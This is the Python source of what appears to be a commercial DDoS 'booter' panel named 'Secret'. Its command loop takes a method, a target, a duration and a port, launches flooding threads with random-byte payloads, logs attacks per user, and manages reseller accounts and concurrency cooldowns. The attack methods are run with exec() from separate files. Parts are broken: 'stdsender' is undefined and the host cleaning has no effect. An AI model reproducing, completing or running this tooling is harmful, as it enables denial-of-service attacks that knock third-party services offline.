import socket
import time
import random
import threading
import getpass
import os
import turtle
import urllib
import json
import calendar
import logging
import sys
import art
import requests
import bcrypt
from tkinter import *
from tkinter import messagebox
from getpass import getpass
from datetime import date
from urllib.request import urlopen
from json import load
from art import *
import datetime



fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0






cooldown_screen = """
[38;2;255;255;255mCooldown Screen.
"""








def user_login(login_execute, author_login, error_solve):
	try:

		with open(author_login, "r") as author_file:
			exec(author_file.read())

		with open(login_execute, "r") as login_file:
			exec(login_file.read())

		thread_start()


	except KeyboardInterrupt:
		with open(error_solve, "r") as anti_crash:
			exec(anti_crash.read())









def attack_terminal(sinput, host, port, timer):
	try:




		if running >= 1:

			print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
			main()




		else:


			with open("branche//databases//user_safe.sql", "r") as f:
				user_log = f.read()



			with open("branche//logs//attacks//users//{}.sql".format(user_log), "a") as f:
				dates = datetime.datetime.now()

				f.write(f"('Method':'{sinput}', 'Target':'{host}', 'Port':'{port}', 'Attack-Date':'{dates}',)\n")
				f.close() 



			with open(f"branche//logs//attacks//all_attacks.sql", "a") as f:

				dates = datetime.datetime.now()

				f.write(f"('user':'{user_log}', 'Method':'{sinput}', 'Target':'{host}', 'Port':'{port}', 'Attack-Date':'{dates}',)\n")
				f.close() 


			with open("branche//logs//ongoing.sql", "w") as f:
				f.write(f"{sinput} {host} {timer} {port}")
				f.close()




			with open("branding//animations//rocket_attack//run.py") as f:
				exec(f.read())


			host.replace("https://", "")
			host.replace("http://", "")
			host.replace("/", "")




			socket.gethostbyname(host)
			pack = 9192
			punch = random._urandom(int(pack))
			threading.Thread(target=stdsender, args=(host, timer, port, punch)).start()




			os.system("cls")
			print(cooldown_screen)
			main()



	except ValueError:
		print("ValueError")
		main()

	except socket.gaierror:
		print(" Invalid Target.")
		main()








def thread_start():
	t1 = threading.Thread(target=title)
	t1.start()
	main()








def title():
	with open("branche//databases//user_safe.sql", "r") as f:
		terminal_username = f.read()

	slaves = random.randint(100,105)

	os.system(f"title ^| ^<Secret^>  ^|  ^<{terminal_username}^>  ^|  ^<{slaves}^>  ^| ^<{running}/12^> ^|")
	time.sleep(3)

	t1 = threading.Thread(target=title)
	t1.start()








def main():


	global fsubs 
	global tpings 
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp


	while True:




		with open("branche//databases//user_safe.sql", "r") as f:
			terminal_username = f.read()




		try:

			time.sleep(0.1)
			sin = input(f"[38;2;3;248;252m{terminal_username} [38;2;255;255;255m@ [38;2;224;44;252mSecret [38;2;255;255;255m~ [38;2;200;200;200m")
			sinput = sin.split(" ")[0]







			if sinput.lower() == "http-get" or sinput.lower() == "http-xv" or sinput.lower() == "http-ovh":
				try:
					if running >= 1:
						print("Wait till your cooldown is over!")
						main()

					else:
						sinput, host, timer, port = sin.split(" ")

						if os.path.exists(f"atk//peaky//{sinput.lower()}.py"):
							with open(f"atk//peaky//{sinput.lower()}.py", "r") as f:
								exec(f.read())

				except ValueError:
					print(" syntax: <method> <target> <time> <port>")









			elif sinput.lower() == "ovh-rail" or sinput.lower() == "http-rail" or sinput == "test":
				try:
					if running >= 1:
						print("Wait till your cooldown is over!")
						main()

					else:
						sinput, host, timer, port = sin.split(" ")

						if os.path.exists(f"atk//vip//{sinput.lower()}.py"):
							with open(f"atk//vip//{sinput.lower()}.py", "r") as f:
								exec(f.read())

				except ValueError:
					print(" syntax: <method> <target> <time> <port>")








			elif sinput.lower() == "ongoing":
				try:
					if running >= 1:
						with open("branche//logs//ongoing.sql", "r") as f:
							print(f.read(), "\n")

					else:
						print("There are currently no ongoing attacks.\n")

				except ValueError:
					print(" ValueError.")








			else:
				sinput = sin.replace(" ", "_")







			if os.path.exists(f"branche//commands//__basic__//{sinput.lower()}_command.py"):
				with open(f"branche//logs//command_logs//{terminal_username}-user_commands.sql", "a") as f:
					
					dates = datetime.datetime.now()
					
					f.write(f"('time':'{dates}', 'command':'{sinput.lower()}')\n")
					f.close()

				with open(f"branche//commands//__basic__//{sinput.lower()}_command.py") as f:
					exec(f.read())







			if sinput.lower() == "adduser" or sinput.lower() == "createuser" or sinput.lower() == "useradd":
				with open("branche//commands//__reseller__//reseller.py") as f:
					exec(f.read())


			elif sinput.lower() == "banuser" or sinput.lower() == "deluser":
				with open("branche//commands//__reseller__//ban_account.py") as f:
					exec(f.read())






		except ValueError:
			print("\n Value Error.")
			main()







		except KeyboardInterrupt:
			print("\n ^C Keyboard Interrupt.")
			main()










with open("etc//login_title.tfx", "r") as f:
	xtest = f.read()

os.system(f"title {xtest}")


user_login(login_execute="secretlogin//userlogin//login.py", author_login="secretlogin//author//2fa_author.py", error_solve="branche//errors//input_errors//anti_crash.py")